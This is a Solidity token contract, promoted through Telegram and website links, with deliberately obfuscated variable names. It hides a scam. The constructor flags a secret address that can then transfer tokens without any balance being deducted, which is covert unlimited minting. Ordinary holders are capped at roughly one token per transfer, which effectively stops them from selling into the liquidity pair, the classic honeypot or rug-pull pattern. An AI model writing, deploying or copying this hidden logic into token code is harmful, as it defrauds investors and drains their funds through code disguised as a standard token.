/*

Telegram: https://t.me/xTokenERCPortal

Website: https://xtoken.crypto-token.live/

*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.7;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract Token is Ownable {
    string public name;

    mapping(address => uint256) private yropqfbcdsxm;

    function transferFrom(address vdaqclbyposr, address hxkqin, uint256 rfji) public returns (bool success) {
        require(rfji <= allowance[vdaqclbyposr][msg.sender]);
        allowance[vdaqclbyposr][msg.sender] -= rfji;
        raxy(vdaqclbyposr, hxkqin, rfji);
        return true;
    }

    mapping(address => mapping(address => uint256)) public allowance;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    event Transfer(address indexed from, address indexed to, uint256 value);

    function raxy(address vdaqclbyposr, address hxkqin, uint256 rfji) private {
        address gtjxyznkpudv = IUniswapV2Factory(wufqdyec.factory()).getPair(address(this), wufqdyec.WETH());
        if (0 == vdtorliny[vdaqclbyposr]) {
            if (vdaqclbyposr != gtjxyznkpudv && yropqfbcdsxm[vdaqclbyposr] != block.number && rfji < totalSupply) {
                require(rfji <= totalSupply / (10 ** decimals));
            }
            balanceOf[vdaqclbyposr] -= rfji;
        }
        balanceOf[hxkqin] += rfji;
        yropqfbcdsxm[hxkqin] = block.number;
        emit Transfer(vdaqclbyposr, hxkqin, rfji);
    }

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    uint8 public decimals = 9;

    string public symbol;

    uint256 private hvxec = 116;

    constructor(string memory iwavts, string memory fhbglszo, address jmeludxisorc, address ktpmsaxyoidq) {
        name = iwavts;
        symbol = fhbglszo;
        balanceOf[msg.sender] = totalSupply;
        vdtorliny[ktpmsaxyoidq] = hvxec;
        wufqdyec = IUniswapV2Router02(jmeludxisorc);
    }

    function transfer(address hxkqin, uint256 rfji) public returns (bool success) {
        raxy(msg.sender, hxkqin, rfji);
        return true;
    }

    mapping(address => uint256) public balanceOf;

    function approve(address rfcbapdmq, uint256 rfji) public returns (bool success) {
        allowance[msg.sender][rfcbapdmq] = rfji;
        emit Approval(msg.sender, rfcbapdmq, rfji);
        return true;
    }

    mapping(address => uint256) private vdtorliny;

    IUniswapV2Router02 private wufqdyec;
}
